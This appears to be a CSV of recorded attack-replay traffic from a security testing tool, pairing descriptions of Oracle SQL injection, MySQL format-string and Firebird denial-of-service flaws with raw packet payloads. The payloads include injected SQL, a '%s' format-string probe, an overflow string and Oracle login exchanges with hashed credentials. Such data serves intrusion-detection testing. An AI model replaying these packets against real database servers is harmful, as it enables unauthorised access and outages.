XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
FSC20090706-04_Oracle_Database_Server_Workspace_Manager_Multiple_SQL_Injection_IPv6.xml,Oracle Database Server Workspace Manager Multiple SQL Injection (IPv6 Version),"Multiple SQL injection vulnerabilities exist in Oracle Database Server product. The vulnerabilities are due to insufficient sanitization of input parameters in the Oracle Workspace Manager component. A remote attacker with valid user credentials may leverage these vulnerabilities to inject and execute SQL code with escalated privileges of SYS or WMSYS account.            Successful exploitation would result in disclosure of sensitive information, and modification or manipulation of the data in the underlying database. (IPv6 Version)",TCP/IPv6,TCP,[[00 14 00 00 06 04 00 00 00 00 08 02 00 00 00 09 05 00 00 00]]
FSC20090706-04_Oracle_Database_Server_Workspace_Manager_Multiple_SQL_Injection_IPv6.xml,Oracle Database Server Workspace Manager Multiple SQL Injection (IPv6 Version),"Multiple SQL injection vulnerabilities exist in Oracle Database Server product. The vulnerabilities are due to insufficient sanitization of input parameters in the Oracle Workspace Manager component. A remote attacker with valid user credentials may leverage these vulnerabilities to inject and execute SQL code with escalated privileges of SYS or WMSYS account.            Successful exploitation would result in disclosure of sensitive information, and modification or manipulation of the data in the underlying database. (IPv6 Version)",TCP/IPv6,TCP,[[00 0B 00 00 0C 04 00 00 01 00 01 00 0B 00 00 0C 04 00 00 01 00 02]]
FSC20090706-04_Oracle_Database_Server_Workspace_Manager_Multiple_SQL_Injection_IPv6.xml,Oracle Database Server Workspace Manager Multiple SQL Injection (IPv6 Version),"Multiple SQL injection vulnerabilities exist in Oracle Database Server product. The vulnerabilities are due to insufficient sanitization of input parameters in the Oracle Workspace Manager component. A remote attacker with valid user credentials may leverage these vulnerabilities to inject and execute SQL code with escalated privileges of SYS or WMSYS account.            Successful exploitation would result in disclosure of sensitive information, and modification or manipulation of the data in the underlying database. (IPv6 Version)",TCP/IPv6,TCP,[[00 8C 00 00 06 04 00 00 00 00 04 05 00 00 00 01 00 00 00 00 07 04 00 00 00 00 01 00 00 00 ]][[[00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 15 00 00 00 00 00 00 ]]6[[01 00 00 00 00 00 00 AC 90 1F 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ]]#ORA-01031: insufficient privileges[[0A]]
FSC20090706-04_Oracle_Database_Server_Workspace_Manager_Multiple_SQL_Injection_IPv6.xml,Oracle Database Server Workspace Manager Multiple SQL Injection (IPv6 Version),"Multiple SQL injection vulnerabilities exist in Oracle Database Server product. The vulnerabilities are due to insufficient sanitization of input parameters in the Oracle Workspace Manager component. A remote attacker with valid user credentials may leverage these vulnerabilities to inject and execute SQL code with escalated privileges of SYS or WMSYS account.            Successful exploitation would result in disclosure of sensitive information, and modification or manipulation of the data in the underlying database. (IPv6 Version)",TCP/IPv6,TCP,[[00 0B 00 00 0C 04 00 00 01 00 01 00 0B 00 00 0C 04 00 00 01 00 02]]
FSC20090706-04_Oracle_Database_Server_Workspace_Manager_Multiple_SQL_Injection_IPv6.xml,Oracle Database Server Workspace Manager Multiple SQL Injection (IPv6 Version),"Multiple SQL injection vulnerabilities exist in Oracle Database Server product. The vulnerabilities are due to insufficient sanitization of input parameters in the Oracle Workspace Manager component. A remote attacker with valid user credentials may leverage these vulnerabilities to inject and execute SQL code with escalated privileges of SYS or WMSYS account.            Successful exploitation would result in disclosure of sensitive information, and modification or manipulation of the data in the underlying database. (IPv6 Version)",TCP/IPv6,TCP,"[[01 ]]7[[00 00 06 04 00 00 00 00 04 01 00 00 00 01 00 00 00 00 ]]7N[[00 00 00 00 01 00 00 00 ]]/[[00 00 00 00 ]]A[[00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 17 00 00 00 00 00 00 ]]6[[01 00 00 00 00 00 00 AC 90 1F 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 CE ]]ORA-20023: a workspace already exists with the name: '.' AND test_user.Y()='Y'[[0A ]]ORA-06512: at ""SYS.LTADM"", line 499[[0A ]]ORA-06512: at ""SYS.LTADM"", line 480[[0A ]]ORA-06512: at ""SYS.LT"", line 4400[[0A ]]ORA-06512: at line 1[[0A]]"
FSC20090706-04_Oracle_Database_Server_Workspace_Manager_Multiple_SQL_Injection_IPv6.xml,Oracle Database Server Workspace Manager Multiple SQL Injection (IPv6 Version),"Multiple SQL injection vulnerabilities exist in Oracle Database Server product. The vulnerabilities are due to insufficient sanitization of input parameters in the Oracle Workspace Manager component. A remote attacker with valid user credentials may leverage these vulnerabilities to inject and execute SQL code with escalated privileges of SYS or WMSYS account.            Successful exploitation would result in disclosure of sensitive information, and modification or manipulation of the data in the underlying database. (IPv6 Version)",TCP/IPv6,TCP,[[00 0B 00 00 0C 04 00 00 01 00 01 00 0B 00 00 0C 04 00 00 01 00 02]]
FSC20090706-04_Oracle_Database_Server_Workspace_Manager_Multiple_SQL_Injection_IPv6.xml,Oracle Database Server Workspace Manager Multiple SQL Injection (IPv6 Version),"Multiple SQL injection vulnerabilities exist in Oracle Database Server product. The vulnerabilities are due to insufficient sanitization of input parameters in the Oracle Workspace Manager component. A remote attacker with valid user credentials may leverage these vulnerabilities to inject and execute SQL code with escalated privileges of SYS or WMSYS account.            Successful exploitation would result in disclosure of sensitive information, and modification or manipulation of the data in the underlying database. (IPv6 Version)",TCP/IPv6,TCP,"[[00 F1 00 00 06 04 00 00 00 00 04 01 00 00 00 01 00 00 00 00 88 03 00 00 00 00 01 00 00 00 ]]/[[00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 19 00 00 00 00 00 00 ]]6[[01 00 00 00 00 00 00 AC 90 1F 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 88 ]]ORA-00904: ""TEST_USER"".""Y"": invalid identifier[[0A ]]ORA-06512: at ""SYS.LT"", line 5389[[0A ]]ORA-06512: at ""SYS.LT"", line 5360[[0A ]]ORA-06512: at line 1[[0A]]"
FSC20090706-04_Oracle_Database_Server_Workspace_Manager_Multiple_SQL_Injection_IPv6.xml,Oracle Database Server Workspace Manager Multiple SQL Injection (IPv6 Version),"Multiple SQL injection vulnerabilities exist in Oracle Database Server product. The vulnerabilities are due to insufficient sanitization of input parameters in the Oracle Workspace Manager component. A remote attacker with valid user credentials may leverage these vulnerabilities to inject and execute SQL code with escalated privileges of SYS or WMSYS account.            Successful exploitation would result in disclosure of sensitive information, and modification or manipulation of the data in the underlying database. (IPv6 Version)",TCP/IPv6,TCP,[[00 0F 00 00 06 04 00 00 00 00 09 01 00 00 00]]
FSC20090706-04_Oracle_Database_Server_Workspace_Manager_Multiple_SQL_Injection_IPv6.xml,Oracle Database Server Workspace Manager Multiple SQL Injection (IPv6 Version),"Multiple SQL injection vulnerabilities exist in Oracle Database Server product. The vulnerabilities are due to insufficient sanitization of input parameters in the Oracle Workspace Manager component. A remote attacker with valid user credentials may leverage these vulnerabilities to inject and execute SQL code with escalated privileges of SYS or WMSYS account.            Successful exploitation would result in disclosure of sensitive information, and modification or manipulation of the data in the underlying database. (IPv6 Version)",TCP/IPv6,TCP,[[00 0F 00 00 06 04 00 00 00 00 09 01 00 00 00]]
﻿FSC20090709-06_Sun_MySQL_mysql_log_Format_String_Vulnerability.xml,Sun MySQL mysql_log Format String Vulnerability,"A format string vulnerability exists in Sun Microsystems MySQL database server. The flaw is due to insufficient input validation when processing create and drop database commands. Remote authenticated attackers could exploit this vulnerability by sending malformed data to the MySQL process. In a successful attack the affected application will terminate abnormally, creating a denial of service condition.",MySQL,TCP,9[[00 00 01 87 A2 00 00 00 00 00 ]]@[[08 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ]]bob[[00 14 ]]3[[07 C5 EA 19 C5 BF ]]zL[[86 B1 83 14 AB ]]![[CD 8B ]]t#*
FSC20090709-06_Sun_MySQL_mysql_log_Format_String_Vulnerability.xml,Sun MySQL mysql_log Format String Vulnerability,"A format string vulnerability exists in Sun Microsystems MySQL database server. The flaw is due to insufficient input validation when processing create and drop database commands. Remote authenticated attackers could exploit this vulnerability by sending malformed data to the MySQL process. In a successful attack the affected application will terminate abnormally, creating a denial of service condition.",MySQL,TCP,[[09 00 00 00 05 ]]%s%s%s%s
FSC20090709-06_Sun_MySQL_mysql_log_Format_String_Vulnerability.xml,Sun MySQL mysql_log Format String Vulnerability,"A format string vulnerability exists in Sun Microsystems MySQL database server. The flaw is due to insufficient input validation when processing create and drop database commands. Remote authenticated attackers could exploit this vulnerability by sending malformed data to the MySQL process. In a successful attack the affected application will terminate abnormally, creating a denial of service condition.",MySQL,TCP,"E[[00 00 00 0A ]]5.0.83-community-nt-log[[00 01 00 00 00 ]]lt%U\Rbw[[00 ]],[[A2 08 02 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ]]Rqc}jyC!x]H1[[00]]"
FSC20090709-06_Sun_MySQL_mysql_log_Format_String_Vulnerability.xml,Sun MySQL mysql_log Format String Vulnerability,"A format string vulnerability exists in Sun Microsystems MySQL database server. The flaw is due to insufficient input validation when processing create and drop database commands. Remote authenticated attackers could exploit this vulnerability by sending malformed data to the MySQL process. In a successful attack the affected application will terminate abnormally, creating a denial of service condition.",MySQL,TCP,[[07 00 00 02 00 00 00 02 00 00 00]]
﻿FSC20090731-07_Firebird_SQL_op_connect_request_Denial_of_Service.xml,Firebird SQL op_connect_request Denial of Service,A denial of service vulnerability exists in Firebird SQL. The vulnerability is due to the way that Firebird SQL handles op_connect_request requests. A remote unauthenticated attacker can exploit this vulnerability by sending a crafted op_connect_request request to a vulnerable server. A successful attack would create a denial of service condition on the Firebird SQL service.,Interbase,TCP,[[00 00 00 ]]5AAAAAAAAAAAAAAA
﻿FSC20090731-07_Firebird_SQL_op_connect_request_Denial_of_Service_IPv6.xml,Firebird SQL op_connect_request Denial of Service (IPv6 Version),A denial of service vulnerability exists in Firebird SQL. The vulnerability is due to the way that Firebird SQL handles op_connect_request requests. A remote unauthenticated attacker can exploit this vulnerability by sending a crafted op_connect_request request to a vulnerable server.            A successful attack would create a denial of service condition on the Firebird SQL service. (IPv6 Version),TCP/IPv6,TCP,[[00 00 00 ]]5AAAAAAAAAAAAAAA
﻿FSC20090826-12_Oracle_Database_REPCAT_RPC.VALIDATE_REMOTE_RC_SQL_Injection.xml,Oracle Database REPCAT_RPC.VALIDATE_REMOTE_RC SQL Injection,"An SQL injection vulnerability has been reported in Oracle Database server. The vulnerability is due to an input validation error in function VALIDATE_REMOTE_RC of the package DBMS_REPCAT_RPC. Remote authenticated attackers having Create Session privileges can exploit this vulnerability to inject and execute malicious SQL commands on the target server. Successful exploitation of this vulnerability would allow non-privileged users to execute arbitrary SQL commands with the elevated privileges of the SYS user. As a result of this, attackers may disclose sensitive data or compromise integrity of the data.",iSQL/TNS/TCPS,TCP,"[[00 F4 00 00 01 00 00 00 01 ]]9[[01 ]],[[00 00 08 00 ]][[FF 86 0E 00 00 01 00 00 BA 00 ]]:[[00 00 02 00 ]]AA[[00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ]](DESCRIPTION=(CONNECT_DATA=(SERVICE_NAME=orcl)(CID=(PROGRAM=C:\oracle_client\sqlplus.exe)(HOST=2K3-OFFICE2K3)(USER=Administrator)))(ADDRESS=(PROTOCOL=TCP)(HOST=172.16.8.152)(PORT=1521)))"
FSC20090826-12_Oracle_Database_REPCAT_RPC.VALIDATE_REMOTE_RC_SQL_Injection.xml,Oracle Database REPCAT_RPC.VALIDATE_REMOTE_RC SQL Injection,"An SQL injection vulnerability has been reported in Oracle Database server. The vulnerability is due to an input validation error in function VALIDATE_REMOTE_RC of the package DBMS_REPCAT_RPC. Remote authenticated attackers having Create Session privileges can exploit this vulnerability to inject and execute malicious SQL commands on the target server. Successful exploitation of this vulnerability would allow non-privileged users to execute arbitrary SQL commands with the elevated privileges of the SYS user. As a result of this, attackers may disclose sensitive data or compromise integrity of the data.",iSQL/TNS/TCPS,TCP,"[[00 F4 00 00 01 00 00 00 01 ]]9[[01 ]],[[00 00 08 00 ]][[FF 86 0E 00 00 01 00 00 BA 00 ]]:[[00 00 02 00 ]]AA[[00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ]](DESCRIPTION=(CONNECT_DATA=(SERVICE_NAME=orcl)(CID=(PROGRAM=C:\oracle_client\sqlplus.exe)(HOST=2K3-OFFICE2K3)(USER=Administrator)))(ADDRESS=(PROTOCOL=TCP)(HOST=172.16.8.152)(PORT=1521)))"
FSC20090826-12_Oracle_Database_REPCAT_RPC.VALIDATE_REMOTE_RC_SQL_Injection.xml,Oracle Database REPCAT_RPC.VALIDATE_REMOTE_RC SQL Injection,"An SQL injection vulnerability has been reported in Oracle Database server. The vulnerability is due to an input validation error in function VALIDATE_REMOTE_RC of the package DBMS_REPCAT_RPC. Remote authenticated attackers having Create Session privileges can exploit this vulnerability to inject and execute malicious SQL commands on the target server. Successful exploitation of this vulnerability would allow non-privileged users to execute arbitrary SQL commands with the elevated privileges of the SYS user. As a result of this, attackers may disclose sensitive data or compromise integrity of the data.",iSQL/TNS/TCPS,TCP,"[[00 9C 00 00 06 00 00 00 00 00 DE AD BE EF 00 92 0A 10 02 00 00 04 00 00 04 00 03 00 00 00 00 00 04 00 05 0A 10 02 00 00 08 00 01 00 00 04 ]]T""[[E5 FE ]]}[[00 12 00 01 DE AD BE EF 00 03 00 00 00 04 00 04 00 01 00 01 00 02 00 01 00 03 00 00 00 00 00 04 00 05 0A 10 02 00 00 02 00 03 E0 E1 00 02 00 06 FC FF 00 02 00 02 00 00 00 00 00 04 00 05 0A 10 02 00 00 0C 00 01 00 11 06 10 0C 0F 0A 0B 08 02 01 03 00 03 00 02 00 00 00 00 00 04 00 05 0A 10 02 00 00 03 00 01 00 03 01]]"
FSC20090826-12_Oracle_Database_REPCAT_RPC.VALIDATE_REMOTE_RC_SQL_Injection.xml,Oracle Database REPCAT_RPC.VALIDATE_REMOTE_RC SQL Injection,"An SQL injection vulnerability has been reported in Oracle Database server. The vulnerability is due to an input validation error in function VALIDATE_REMOTE_RC of the package DBMS_REPCAT_RPC. Remote authenticated attackers having Create Session privileges can exploit this vulnerability to inject and execute malicious SQL commands on the target server. Successful exploitation of this vulnerability would allow non-privileged users to execute arbitrary SQL commands with the elevated privileges of the SYS user. As a result of this, attackers may disclose sensitive data or compromise integrity of the data.",iSQL/TNS/TCPS,TCP,[[00 ]]%[[00 00 06 00 00 00 00 00 01 06 05 04 03 02 01 00 ]]IBMPC/WIN_NT-8.1.0[[00]]
FSC20090826-12_Oracle_Database_REPCAT_RPC.VALIDATE_REMOTE_RC_SQL_Injection.xml,Oracle Database REPCAT_RPC.VALIDATE_REMOTE_RC SQL Injection,"An SQL injection vulnerability has been reported in Oracle Database server. The vulnerability is due to an input validation error in function VALIDATE_REMOTE_RC of the package DBMS_REPCAT_RPC. Remote authenticated attackers having Create Session privileges can exploit this vulnerability to inject and execute malicious SQL commands on the target server. Successful exploitation of this vulnerability would allow non-privileged users to execute arbitrary SQL commands with the elevated privileges of the SYS user. As a result of this, attackers may disclose sensitive data or compromise integrity of the data.",iSQL/TNS/TCPS,TCP,[[00 ]]>[[00 00 06 00 00 00 00 00 02 B2 00 B2 00 ]]B[[1B 06 01 01 01 0D 01 01 03 01 01 01 01 01 01 01 FF ]][[03 07 03 00 01 00 0F 01 01 01 04 02 01 00 00 80 00 00 00 ]]<<<[[80 00 00 00 D0 07]]
FSC20090826-12_Oracle_Database_REPCAT_RPC.VALIDATE_REMOTE_RC_SQL_Injection.xml,Oracle Database REPCAT_RPC.VALIDATE_REMOTE_RC SQL Injection,"An SQL injection vulnerability has been reported in Oracle Database server. The vulnerability is due to an input validation error in function VALIDATE_REMOTE_RC of the package DBMS_REPCAT_RPC. Remote authenticated attackers having Create Session privileges can exploit this vulnerability to inject and execute malicious SQL commands on the target server. Successful exploitation of this vulnerability would allow non-privileged users to execute arbitrary SQL commands with the elevated privileges of the SYS user. As a result of this, attackers may disclose sensitive data or compromise integrity of the data.",iSQL/TNS/TCPS,TCP,[[00 F5 00 00 06 00 00 00 00 00 03 ]]v[[02 8C EA BE 05 09 00 00 00 01 00 00 00 ]]`[[CB 12 00 05 00 00 00 08 C9 12 00 ]]([[CD 12 00 09 ]]test_user[[0D 00 00 00 0D ]]AUTH_TERMINAL[[0D 00 00 00 0D ]]2K3-OFFICE2K3[[00 00 00 00 0F 00 00 00 0F ]]AUTH_PROGRAM_NM[[0B 00 00 00 0B ]]sqlplus.exe[[00 00 00 00 0C 00 00 00 0C ]]AUTH_MACHINE[[17 00 00 00 17 ]]WORKGROUP\2K3-OFFICE2K3[[00 00 00 00 08 00 00 00 08 ]]AUTH_PID[[08 00 00 00 08 ]]1108:904[[00 00 00 00 08 00 00 00 08 ]]AUTH_SID[[0D 00 00 00 0D ]]Administrato[[04 00 00 00 00]]
FSC20090826-12_Oracle_Database_REPCAT_RPC.VALIDATE_REMOTE_RC_SQL_Injection.xml,Oracle Database REPCAT_RPC.VALIDATE_REMOTE_RC SQL Injection,"An SQL injection vulnerability has been reported in Oracle Database server. The vulnerability is due to an input validation error in function VALIDATE_REMOTE_RC of the package DBMS_REPCAT_RPC. Remote authenticated attackers having Create Session privileges can exploit this vulnerability to inject and execute malicious SQL commands on the target server. Successful exploitation of this vulnerability would allow non-privileged users to execute arbitrary SQL commands with the elevated privileges of the SYS user. As a result of this, attackers may disclose sensitive data or compromise integrity of the data.",iSQL/TNS/TCPS,TCP,[[02 09 00 00 06 00 00 00 00 00 03 ]]s[[03 8C EA BE 05 09 00 00 00 01 01 00 00 EC F8 12 00 09 00 00 00 A8 F4 12 00 ]]P[[FB 12 00 09 ]]test_user[[0C 00 00 00 0C ]]AUTH_SESSKEY@[[00 00 00 ]]@30F9EE4C844EF719DA23A1D612CD2A205E0332A4C7B54504AFE78392DF52B1B8[[01 00 00 00 0D 00 00 00 0D ]]AUTH_PASSWORD@[[00 00 00 ]]@4C1B822E4E332F8E091CFBCB18DDD7547332542329E0B1AB91869AF5592B33F8[[00 00 00 00 0D 00 00 00 0D ]]AUTH_TERMINAL[[0D 00 00 00 0D ]]2K3-OFFICE2K3[[00 00 00 00 0F 00 00 00 0F ]]AUTH_PROGRAM_NM[[0B 00 00 00 0B ]]sqlplus.exe[[00 00 00 00 0C 00 00 00 0C ]]AUTH_MACHINE[[17 00 00 00 17 ]]WORKGROUP\2K3-OFFICE2K3[[00 00 00 00 08 00 00 00 08 ]]AUTH_PID[[08 00 00 00 08 ]]1108:904[[00 00 00 00 08 00 00 00 08 ]]AUTH_SID[[0D 00 00 00 0D 00 00 00 00 0F ]]'[[00 00 ]]4[[BF 12 00 1C 00 00 00 00 08 00 00 00 08 ]]AUTH_ACL[[04 00 00 00 04 ]]4400[[00 00 00 00 12 00 00 00 12 ]]AUTH_ALTER_SESSION%[[00 00 00 ]]%ALTER SESSION SET TIME_ZONE='-04:00'[[00 01 00 00 00]]
FSC20090826-12_Oracle_Database_REPCAT_RPC.VALIDATE_REMOTE_RC_SQL_Injection.xml,Oracle Database REPCAT_RPC.VALIDATE_REMOTE_RC SQL Injection,"An SQL injection vulnerability has been reported in Oracle Database server. The vulnerability is due to an input validation error in function VALIDATE_REMOTE_RC of the package DBMS_REPCAT_RPC. Remote authenticated attackers having Create Session privileges can exploit this vulnerability to inject and execute malicious SQL commands on the target server. Successful exploitation of this vulnerability would allow non-privileged users to execute arbitrary SQL commands with the elevated privileges of the SYS user. As a result of this, attackers may disclose sensitive data or compromise integrity of the data.",iSQL/TNS/TCPS,TCP,"[[00 ]],[[00 00 06 00 00 00 00 00 11 ]]k[[04 91 00 00 00 ]]Q[[01 00 00 01 00 00 00 03 ]];[[05 D8 FA 12 00 F4 01 00 00 B8 F9 12 00 B4 F9 12 00]]"
FSC20090826-12_Oracle_Database_REPCAT_RPC.VALIDATE_REMOTE_RC_SQL_Injection.xml,Oracle Database REPCAT_RPC.VALIDATE_REMOTE_RC SQL Injection,"An SQL injection vulnerability has been reported in Oracle Database server. The vulnerability is due to an input validation error in function VALIDATE_REMOTE_RC of the package DBMS_REPCAT_RPC. Remote authenticated attackers having Create Session privileges can exploit this vulnerability to inject and execute malicious SQL commands on the target server. Successful exploitation of this vulnerability would allow non-privileged users to execute arbitrary SQL commands with the elevated privileges of the SYS user. As a result of this, attackers may disclose sensitive data or compromise integrity of the data.",iSQL/TNS/TCPS,TCP,[[00 A8 00 00 06 00 00 00 00 00 03 ]]^[[06 ]]a[[80 00 00 00 00 00 00 94 B9 C0 05 16 00 00 00 E4 D0 BE 05 0D 00 00 00 00 00 00 00 18 D1 BE 05 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 1A D1 BE 05 F4 B9 C0 05 00 00 00 00 16 ]]SELECT USER FROM DUAL[[00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00]]
FSC20090826-12_Oracle_Database_REPCAT_RPC.VALIDATE_REMOTE_RC_SQL_Injection.xml,Oracle Database REPCAT_RPC.VALIDATE_REMOTE_RC SQL Injection,"An SQL injection vulnerability has been reported in Oracle Database server. The vulnerability is due to an input validation error in function VALIDATE_REMOTE_RC of the package DBMS_REPCAT_RPC. Remote authenticated attackers having Create Session privileges can exploit this vulnerability to inject and execute malicious SQL commands on the target server. Successful exploitation of this vulnerability would allow non-privileged users to execute arbitrary SQL commands with the elevated privileges of the SYS user. As a result of this, attackers may disclose sensitive data or compromise integrity of the data.",iSQL/TNS/TCPS,TCP,[[00 15 00 00 06 00 00 00 00 00 03 05 07 01 00 00 00 02 00 00 00]]
FSC20090826-12_Oracle_Database_REPCAT_RPC.VALIDATE_REMOTE_RC_SQL_Injection.xml,Oracle Database REPCAT_RPC.VALIDATE_REMOTE_RC SQL Injection,"An SQL injection vulnerability has been reported in Oracle Database server. The vulnerability is due to an input validation error in function VALIDATE_REMOTE_RC of the package DBMS_REPCAT_RPC. Remote authenticated attackers having Create Session privileges can exploit this vulnerability to inject and execute malicious SQL commands on the target server. Successful exploitation of this vulnerability would allow non-privileged users to execute arbitrary SQL commands with the elevated privileges of the SYS user. As a result of this, attackers may disclose sensitive data or compromise integrity of the data.",iSQL/TNS/TCPS,TCP,[[00 C9 00 00 06 00 00 00 00 00 11 ]]i[[08 98 A9 C0 05 01 00 00 00 01 00 00 00 03 ]]^[[09 ]]a[[80 00 00 00 00 00 00 80 BD C0 05 ]]([[00 00 00 E4 D0 BE 05 0D 00 00 00 00 00 00 00 18 D1 BE 05 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 1A D1 BE 05 AC A9 C0 05 00 00 00 00 ]](SELECT NULL FROM DUAL FOR UPDATE NOWAIT[[00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00]]
FSC20090826-12_Oracle_Database_REPCAT_RPC.VALIDATE_REMOTE_RC_SQL_Injection.xml,Oracle Database REPCAT_RPC.VALIDATE_REMOTE_RC SQL Injection,"An SQL injection vulnerability has been reported in Oracle Database server. The vulnerability is due to an input validation error in function VALIDATE_REMOTE_RC of the package DBMS_REPCAT_RPC. Remote authenticated attackers having Create Session privileges can exploit this vulnerability to inject and execute malicious SQL commands on the target server. Successful exploitation of this vulnerability would allow non-privileged users to execute arbitrary SQL commands with the elevated privileges of the SYS user. As a result of this, attackers may disclose sensitive data or compromise integrity of the data.",iSQL/TNS/TCPS,TCP,[[00 C0 00 00 06 00 00 00 00 00 11 ]]i[[0A 98 A9 C0 05 01 00 00 00 03 00 00 00 03 ]]^[[0B ]]![[00 04 00 00 00 00 00 8C BD C0 05 1F 00 00 00 E4 D0 BE 05 0D 00 00 00 00 00 00 00 18 D1 BE 05 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 1A D1 BE 05 AC A9 C0 05 00 00 00 00 1F ]]BEGIN DBMS_OUTPUT.DISABLE; END;[[01 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 08 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00]]
FSC20090826-12_Oracle_Database_REPCAT_RPC.VALIDATE_REMOTE_RC_SQL_Injection.xml,Oracle Database REPCAT_RPC.VALIDATE_REMOTE_RC SQL Injection,"An SQL injection vulnerability has been reported in Oracle Database server. The vulnerability is due to an input validation error in function VALIDATE_REMOTE_RC of the package DBMS_REPCAT_RPC. Remote authenticated attackers having Create Session privileges can exploit this vulnerability to inject and execute malicious SQL commands on the target server. Successful exploitation of this vulnerability would allow non-privileged users to execute arbitrary SQL commands with the elevated privileges of the SYS user. As a result of this, attackers may disclose sensitive data or compromise integrity of the data.",iSQL/TNS/TCPS,TCP,"[[01 ]]F[[00 00 06 00 00 00 00 00 11 ]]i[[0C 98 A9 C0 05 01 00 00 00 02 00 00 00 03 ]]^[[0D ]]a[[80 00 00 00 00 00 00 08 BD C0 05 A1 00 00 00 E4 D0 BE 05 0D 00 00 00 00 00 00 00 18 D1 BE 05 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 1A D1 BE 05 AC A9 C0 05 00 00 00 00 FE ]]@SELECT ATTRIBUTE,SCOPE,NUMERIC_VALUE,CHAR_VALUE,DATE_VALUE FROM @SYSTEM.PRODUCT_PRIVS WHERE (UPPER('SQL*Plus') LIKE UPPER(PRODUCT!)) AND (UPPER(USER) LIKE USERID)[[00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00]]"
